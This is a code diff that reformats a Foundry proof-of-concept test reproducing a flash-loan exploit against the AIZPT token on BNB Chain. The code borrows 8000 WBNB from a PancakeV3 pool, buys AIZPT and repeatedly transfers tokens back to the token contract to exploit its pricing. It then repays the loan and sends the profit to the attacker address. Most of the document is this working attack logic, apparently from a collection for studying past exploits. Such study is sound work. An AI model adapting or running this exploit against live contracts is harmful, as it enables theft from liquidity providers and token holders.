@@ -21,7 +21,7 @@ contract AIZPTToken_exp is Test {
     address attacker = makeAddr("attacker");
 
     function setUp() public {
-        vm.createSelectFork("bsc", 42846998 - 1);
+        vm.createSelectFork("bsc", 42_846_998 - 1);
     }
 
     function testPoC() public {
@@ -31,56 +31,41 @@ contract AIZPTToken_exp is Test {
 
         attackerC.attack();
 
-        console.log('Final balance in wBNB :', IERC20(weth).balanceOf(attacker));
+        console.log("Final balance in wBNB :", IERC20(weth).balanceOf(attacker));
     }
 }
 
 contract AttackerC {
     function attack() external {
-        IFS(PancakeV3Pool).flash(
-            address(this),
-            0,
-            8000 ether,
-            ""
-        );
+        IFS(PancakeV3Pool).flash(address(this), 0, 8000 ether, "");
 
-        IERC20(weth).transfer(
-            msg.sender, 
-            IERC20(weth).balanceOf(address(this))
-        );
+        IERC20(weth).transfer(msg.sender, IERC20(weth).balanceOf(address(this)));
     }
 
-    function pancakeV3FlashCallback(
-        uint256 fee0,
-        uint256 fee1,
-        bytes calldata data
-    ) external {
+    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
         IFS(weth).withdraw(8000 ether);
 
         AIZPT.call{value: 8000 ether}("");
-        
+
         for (uint256 i; i < 199; ++i) {
-            IERC20(AIZPT).transfer(AIZPT, 3837275 ether);
+            IERC20(AIZPT).transfer(AIZPT, 3_837_275 ether);
         }
 
         IFS(weth).deposit{value: address(this).balance}();
 
-        IERC20(weth).transfer(PancakeV3Pool, 8004100000000000000000);
+        IERC20(weth).transfer(PancakeV3Pool, 8_004_100_000_000_000_000_000);
     }
 
-    receive() external payable{}
+    receive() external payable {}
 }
 
 interface IFS is IERC20 {
     // PancakeV3Pool
-    function flash(
-        address recipient,
-        uint256 amount0,
-        uint256 amount1,
-        bytes calldata data
-    ) external;
+    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
 
     // WETH
-    function withdraw(uint256) external;
+    function withdraw(
+        uint256
+    ) external;
     function deposit() external payable;
 }
